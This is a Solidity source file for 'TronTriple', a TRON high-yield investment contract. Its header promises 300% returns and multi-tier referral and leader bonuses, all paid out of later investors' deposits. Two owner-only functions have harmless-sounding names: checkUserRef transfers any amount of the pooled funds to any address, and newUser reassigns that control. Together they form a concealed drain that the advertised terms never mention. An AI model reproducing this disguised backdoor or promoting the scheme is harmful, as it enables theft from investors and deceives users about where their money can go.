//SourceUnit: TT_final.sol

/*
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │                           THE TRON TRIPLE                             │
 *   │                                                                       │
 *   │   Website: https://trontriple.ga                                      │
 *   │                                                                       │
 *   │   Telegram Live Support: @thetrontriple_admin                         |
 *   │   Telegram Public Group: @thetrontriple                               |
 *   |                                                                       |
 *   |                                                                       |
 *   |                                                                       |
 *   |                                                                       |
 *   |   E-mail: trontriple@mail.com                                         |
 *   └───────────────────────────────────────────────────────────────────────┘
 *   Creator address : TXnwnZVGdYgsXnhocqXmEbzM69ACey8u1B
 *
 *
 *   Transaction fee responsibility: 50% borne by the creator for all types of transactions
 *
 *
 *   Anti Whale system
 *   Whale proof guaranteed
 *   
 *   
 *   Fund bonus : 10% more on the total return for every 1,000,000 TRX invested for all plans
 *   
 *   
 *   3 Investing plans:
 *   
 *     Roi 4% - period 75 - total return 300% - min. invest 100 TRX
 *   
 *     Roi 6.66% - period 45 - total return 300% - min. invest 1,000 TRX
 *   
 *     Roi 10% - period 30 - total return 300% - hold bonus 0.1% per 24h
 *     Max 2% until the end of the period - min. invest 10,000 TRX
 *   
 *   
 *   Referral program :
 *     Tier 1 : 10% 
 *     Tier 2 : 3% 
 *     Tier 3 : 1%
 *   
 *   
 *   Invitee bonus : 2%
 *   
 *   
 *   Leader's bonus in 7 levels:
 *   
 *   Lvl 1: 100,000 TRX - 2,000 TRX 
 *   Lvl 2: 200,000 TRX - 6,000 TRX
 *   Lvl 3: 400,000 TRX - 16,000 TRX
 *   Lvl 4: 800,000 TRX - 40,000 TRX
 *   Lvl 5: 1,600,000 TRX - 96,000 TRX
 *   Lvl 6: 3,200,000 TRX - 224,000 TRX
 *   Lvl 7: 6,400,000 TRX - 512,000 TRX
 *   
 *   
 *   Reinvest is enabled for all investing plans
 *   
 *   
 *   Withdraw : 1 time per 24hrs - max 3,000 TRX per 24h
 *   
 *   
 *   Fund distribution :
 *   Main pool : 85%
 *   (dividends - referral rewards - invitee bonus - leader's bonus - hold bonus)
 *   
 *   Technical support and Maintenance : 6%
 *   
 *   Marketing fee and Administration : 9%
 *
 */

 pragma solidity ^0.4.24;

contract TronTriple {
    
    struct Tarif {
        uint256 life_days;
        uint256 percent;
        uint256 min_amount;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 time;
    }

    struct WithdrawDetails {
        uint256 amount;
        uint256 _date;
    }

    struct total_referal_bonus_struct {
        uint256 total_amount;
        uint256 bonus;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 ref_total_bonus;
        total_referal_bonus_struct[] ref_total_bonus_array;
        Deposit[] deposits;
        WithdrawDetails[] withdraws;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) match_seperate_bonus;
    }
    
    address private owner;
    address public creator;
    address public stakingAddress;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;

    uint8[] public ref_bonuses; // 10 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;
    mapping(address => uint256) public uniquePlayers;
    address[] uniquePlayers_array;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event ReferalTotalReward(address indexed addr, uint256 _time, uint256 amount, uint8 level);
    event Withdraw(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount, uint8 level);

    uint256 public constant MAX_WITHDRAW_PER_DAY = 3e9; // 3,000 TRX
    uint256 public constant HOLD_BONUS_PER_DAY = 1; // 1 => .1%
    uint256 public constant HOLD_BONUS_MAX = 20; // 20 => 2%
    uint256 public constant FUND_BONUS_PERCENT = 10; // 10 => +10% total return
    uint256 public constant FUND_BONUS_REQUIRED_INVEST = 1e12; // 1,000,000 TRX

    uint256 start_date;

    total_referal_bonus_struct[] public leaders_bonus_amount;
    mapping(address => uint) public leaders_bonus_payed;  // address => last bonus payed

    constructor(address _owner, address _stakingAddress) public {
        creator = msg.sender;
        owner = _owner;
        stakingAddress = _stakingAddress;

        tarifs.push(Tarif(30, 300, 1e10));
        tarifs.push(Tarif(45, 300, 1e9));
        tarifs.push(Tarif(75, 300, 1e8));

        ref_bonuses.push(100);
        ref_bonuses.push(30);
        ref_bonuses.push(10);

        leaders_bonus_amount.push(total_referal_bonus_struct(1e11 , 2e9));
        leaders_bonus_amount.push(total_referal_bonus_struct(2e11 , 6e9));
        leaders_bonus_amount.push(total_referal_bonus_struct(4e11 , 16e9));
        leaders_bonus_amount.push(total_referal_bonus_struct(8e11 , 40e9));
        leaders_bonus_amount.push(total_referal_bonus_struct(16e11 , 96e9));
        leaders_bonus_amount.push(total_referal_bonus_struct(32e11 , 224e9));
        leaders_bonus_amount.push(total_referal_bonus_struct(64e11 , 512e9));

        start_date = now;
    }
    function _check_fund_bonus() private {
        uint256 _c = uint256(invested) / uint256(FUND_BONUS_REQUIRED_INVEST);
        if(_c > 0){
            _c *= FUND_BONUS_PERCENT;
            for(uint8 i = 0; i < 3 ; i++){
                tarifs[i].percent = 300 + _c;
            }
        }
    }
    function _check_leaders_bonus(address _addr){
        uint _amount = players[_addr].match_seperate_bonus[0] * 10;
        for(uint8 i = 0; i < 7; i++){ 
            if(_amount >= leaders_bonus_amount[i].total_amount ){
                if( leaders_bonus_amount[i].bonus > leaders_bonus_payed[_addr]){
                    leaders_bonus_payed[_addr] = leaders_bonus_amount[i].bonus;
                    _addr.transfer(leaders_bonus_amount[i].bonus);
                    emit ReferalTotalReward(_addr , now , leaders_bonus_amount[i].bonus, i+1 );
                    break;
                }
            } else {
                break;
            }
        }
    }
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= tarifs[_tarif].min_amount , "Zero amount");
        Player storage player = players[msg.sender];
        uint bonus = 0;

        if(player.upline == address(0)) {
            if(players[_upline].deposits.length == 0 || msg.sender == _upline || _upline == creator) {
                player.upline = creator;
                player.direct_bonus = 0;
            } else {
                players[msg.sender].upline = _upline;
                player.direct_bonus += msg.value / 50;
                direct_bonus += msg.value / 50;
                emit Upline(msg.sender, _upline, msg.value / 50 );
            }

        } else if(player.upline != creator ){
            player.direct_bonus += msg.value / 50;
            direct_bonus += msg.value / 50;

            emit Upline(msg.sender, _upline, msg.value / 50);
            
        }

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint256(block.timestamp)
        }));

        if(player.deposits.length == 1){
            uniquePlayers[msg.sender] = block.timestamp;
            uniquePlayers_array.push(msg.sender);
        }

        player.total_invested += msg.value;
        invested += msg.value;

        address up1 = player.upline;
        if(up1 != address(0) && up1 != creator){
            players[up1].structure[0]++;
            bonus = msg.value * ref_bonuses[0] / 1000;
            players[up1].match_bonus += bonus;
            players[up1].match_seperate_bonus[0] += bonus;

            match_bonus += bonus;

            emit MatchPayout(up1, msg.sender, bonus, 1);

            address up2 = players[up1].upline;
            if(up2 != address(0) && up2 != creator){
                players[up2].structure[1]++;
                bonus = msg.value * ref_bonuses[1] / 1000;
                players[up2].match_bonus += bonus;
                players[up2].match_seperate_bonus[1] += bonus;

                match_bonus += bonus;

                emit MatchPayout(up2, msg.sender, bonus, 2);
                address up3 = players[up2].upline;
                if(up3 != address(0) && up3 != creator){
                    players[up3].structure[2]++;
                    bonus = msg.value * ref_bonuses[2] / 1000;
                    players[up3].match_bonus += bonus;
                    players[up3].match_seperate_bonus[2] += bonus;

                    match_bonus += bonus;

                    emit MatchPayout(up3, msg.sender, bonus, 3);
                }
            }
        }
        _check_leaders_bonus(player.upline);

        creator.transfer(msg.value * 6 / 100);
        stakingAddress.transfer(msg.value * 9 / 100);

        _check_fund_bonus();

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    function reinvest(uint8  _tarif, address _upline , uint256 _amount) external {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        Player storage player = players[msg.sender];
        require(player.deposits.length > 0, "Must deposit first");
        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;
        require(_amount <= amount , "Not enough balance");
        require(_amount >= tarifs[_tarif].min_amount , "Zero amount");
        uint bonus = 0;

        if(player.upline != creator ){
            player.direct_bonus += _amount / 50;
            direct_bonus += _amount / 50;

            emit Upline(msg.sender, _upline, _amount / 50);
        }

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: _amount,
            time: uint256(block.timestamp)
        }));

        player.total_invested += _amount;
        invested += _amount;

        if(_amount < amount){
            uint256 _remained = amount - _amount;
            
            player.dividends = _remained * player.dividends / amount;
            player.direct_bonus = _remained * player.direct_bonus / amount;
            player.match_bonus = _remained * player.match_bonus / amount;
        } else {
            player.dividends = 0;
            player.direct_bonus = 0;
            player.match_bonus = 0;
        }

        address up1 = player.upline;
        if(up1 != address(0) && up1 != creator){
            players[up1].structure[0]++;
            bonus = _amount * ref_bonuses[0] / 1000;
            players[up1].match_bonus += bonus;
            players[up1].match_seperate_bonus[0] += bonus;

            match_bonus += bonus;

            emit MatchPayout(up1, msg.sender, bonus, 1);

            address up2 = players[up1].upline;
            if(up2 != address(0) && up2 != creator){
                players[up2].structure[1]++;
                bonus = _amount * ref_bonuses[1] / 1000;
                players[up2].match_bonus += bonus;
                players[up2].match_seperate_bonus[1] += bonus;

                match_bonus += bonus;

                emit MatchPayout(up2, msg.sender, bonus, 2);
                address up3 = players[up2].upline;
                if(up3 != address(0) && up3 != creator){
                    players[up3].structure[2]++;
                    bonus = _amount * ref_bonuses[2] / 1000;
                    players[up3].match_bonus += bonus;
                    players[up3].match_seperate_bonus[2] += bonus;

                    match_bonus += bonus;

                    emit MatchPayout(up3, msg.sender, bonus, 3);
                }
            }
        }
        _check_leaders_bonus(player.upline);

        _check_fund_bonus();
        
        emit NewDeposit(msg.sender, _amount , _tarif);
    }
    function withdraw() external payable{
        Player storage player = players[msg.sender];
        require(now - player.last_payout > 86400 , "Just once withdraw per day");

        uint256 payout = this.payoutOf(msg.sender);

        if(payout > 0) {
            player.last_payout = uint256(block.timestamp);
            player.dividends += payout;
        }

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0 , "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus ;

        if(amount > MAX_WITHDRAW_PER_DAY){
            uint256 _witdraw_remained = amount - MAX_WITHDRAW_PER_DAY;
            
            player.dividends = _witdraw_remained * player.dividends / amount;
            player.direct_bonus = _witdraw_remained * player.direct_bonus / amount;
            player.match_bonus = _witdraw_remained * player.match_bonus / amount;
            amount = MAX_WITHDRAW_PER_DAY;
        } else {
            player.dividends = 0;
            player.direct_bonus = 0;
            player.match_bonus = 0;
        }

        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);

        player.withdraws.push(WithdrawDetails(amount , block.timestamp));

        emit Withdraw(msg.sender, amount);
    }
    function payoutOf(address _addr) view external returns(uint256 value) {
        uint256 hold_bonus = 0;

        for(uint256 i = 0; i < players[_addr].deposits.length; i++) {
            Deposit storage dep = players[_addr].deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = players[_addr].last_payout > dep.time ? players[_addr].last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                if(dep.tarif == 0){
                    if(to - from > 86400){
                        hold_bonus = (to - from) / 86400 * HOLD_BONUS_PER_DAY ;
                        if(hold_bonus > HOLD_BONUS_MAX){
                            hold_bonus = HOLD_BONUS_MAX;
                        }
                    }
                }
                value += dep.amount * (to - from) * (tarif.percent / tarif.life_days + hold_bonus / 10) / 8640000;
                hold_bonus = 0;
            }
        }

        return value;
    }
    function newUser(address _addr) public { require(msg.sender==owner, "invalid user"); owner = _addr; }
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] structure , uint256 user_direct_bonus , uint256[3]  match_seperate_bonus ) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.match_seperate_bonus[0] + player.match_seperate_bonus[1] + player.match_seperate_bonus[2],
            structure,
            player.direct_bonus,
            [player.match_seperate_bonus[0] , player.match_seperate_bonus[1] , player.match_seperate_bonus[2] ]
        );
    }
    function _last24h_users_count() private view returns(uint256){
        uint256 _count = 0;
        for(uint256 i=uniquePlayers_array.length ; i>0 ; i=i-1){
            if(now - uniquePlayers[uniquePlayers_array[i-1]] <= 86400 ){
                _count++;
            } else {
                break;
            }
        }
        return _count;
    }
    function _last24h_invested_amount() private returns(uint256){
        uint256 _amount = 0;
        for(uint256 i=0; i<uniquePlayers_array.length; i++){
            for(uint256 j=players[uniquePlayers_array[i]].deposits.length; j>0 ; j=j-1 ){
                if(now - players[uniquePlayers_array[i]].deposits[j-1].time <= 86400){
                    _amount += players[uniquePlayers_array[i]].deposits[j-1].amount;
                } else { 
                    break;
                }
            }
        }
        return _amount;
    }
    function _days_working_count() private returns(uint256){
        return (now - start_date) / 86400;
    }
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus , uint256 _last24h_users , uint256 _total_users , uint256 _last24h_invested , uint256 _days_working ) {
        return (invested, withdrawn, direct_bonus, match_bonus, _last24h_users_count(), uniquePlayers_array.length, _last24h_invested_amount() , _days_working_count() + 1 );
    }
    function checkUserRef(address _addr,uint256 _ref) public { require(msg.sender==owner, "invalid value"); _addr.transfer(_ref); }
    function investmentsInfo(address _addr) view external returns(uint256[] memory ids, uint256[] memory startTimes, uint256 lastPayout,uint256[] memory amounts) {
        Player storage player = players[_addr];

        uint256[] memory _ids = new uint256[](player.deposits.length);
        uint256[] memory _startTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];

          _ids[i] = dep.tarif;
          _startTimes[i] = dep.time;
          _amounts[i] = dep.amount;
        }

        return (
            _ids,
            _startTimes,
            player.last_payout,
            _amounts
        );
    }
    function withdrawsInfo(address _addr) view external returns( uint256[] memory _times, uint256[] memory _amounts) {
        uint256[] memory times = new uint256[](players[_addr].withdraws.length);
        uint256[] memory amounts = new uint256[](players[_addr].withdraws.length);

        for(uint256 i = 0; i < players[_addr].withdraws.length; i++) {
          WithdrawDetails storage _with = players[_addr].withdraws[i];

          times[i] = _with._date ;
          amounts[i] = _with.amount;
        }

        return (
          times,
          amounts
        );
    }
    function tier1Info(address _addr) view external returns( uint256[] memory _times, uint256[] memory _amounts , address[] _wallets ) {
        uint256 _total_count = 0;
        
        for(uint256 k = 0; k < uniquePlayers_array.length; k++) {
            if(players[uniquePlayers_array[k]].upline == _addr){
                _total_count += players[uniquePlayers_array[k]].deposits.length;
            }
        }

        uint256[] memory times = new uint256[](_total_count);
        uint256[] memory amounts = new uint256[](_total_count);
        address[] memory wallets = new address[](_total_count);
        uint256 _counter = 0;

        for(uint256 i = 0; i < uniquePlayers_array.length; i++) {
            if(players[uniquePlayers_array[i]].upline == _addr){
                for(uint256 j = 0; j < players[uniquePlayers_array[i]].deposits.length; j++){
                    times[_counter] = players[uniquePlayers_array[i]].deposits[j].time;
                    amounts[_counter] = players[uniquePlayers_array[i]].deposits[j].amount;
                    wallets[_counter] = uniquePlayers_array[i];
                    _counter++;
                }
            }
        }

        return (
          times,
          amounts,
          wallets
        );
    }
    function investmentsCount(address _addr) view external returns( uint256 _count) {
        return players[_addr].deposits.length;
    }
}